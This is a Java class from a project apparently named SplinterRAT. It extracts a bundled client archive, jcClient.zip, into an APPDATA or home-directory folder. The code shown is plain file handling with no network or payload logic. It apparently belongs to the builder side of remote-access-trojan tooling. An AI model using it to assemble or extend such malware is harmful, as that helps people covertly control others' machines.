package Compiler;



import net.lingala.zip4j.ZipFile;
import org.apache.commons.lang3.SystemUtils;


import javax.swing.*;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.concurrent.Callable;


public class ClientExtractor implements Callable<Boolean> {

    public static Path localClientFiles;

    public ClientExtractor(){
        generateDestinationFolder();
    }


    private void generateDestinationFolder(){
        String folderDestination = "";
        if (SystemUtils.IS_OS_WINDOWS) {
            folderDestination = System.getenv("APPDATA");

        } else if (SystemUtils.IS_OS_LINUX) {
            folderDestination = System.getProperty("user.home");
        }
        localClientFiles = Path.of(folderDestination, "SplinterRAT", "Client Files");
    }

    public boolean checkIfClientFilesAlreadyExists(){
        return localClientFiles.toFile().exists();
    }


    @Override
    public Boolean call() {
        return extractClientFilesFromJAR();
    }


    public boolean extractClientFilesFromJAR() {
        InputStream stream;
        String fileName = "/jcClient.zip";
        if (!Files.exists(localClientFiles)) {
            try {
                Files.createDirectories(localClientFiles);
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        Path fileLocation = Paths.get(localClientFiles.toString(), fileName);
        try (OutputStream resStreamOut = new FileOutputStream(fileLocation.toFile());
             ZipFile zipFile = new ZipFile(fileLocation.toFile())) {
            stream = ClientExtractor.class.getResourceAsStream(fileName);
            int readBytes;
            byte[] buffer = new byte[4096];
            if (stream != null) {
                while ((readBytes = stream.read(buffer)) > 0) {
                    resStreamOut.write(buffer, 0, readBytes);
                }
            } else {
                return false;
            }
            zipFile.extractAll(localClientFiles.toString());
            System.out.println("Extracted local files: "+localClientFiles);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return true;

    }


}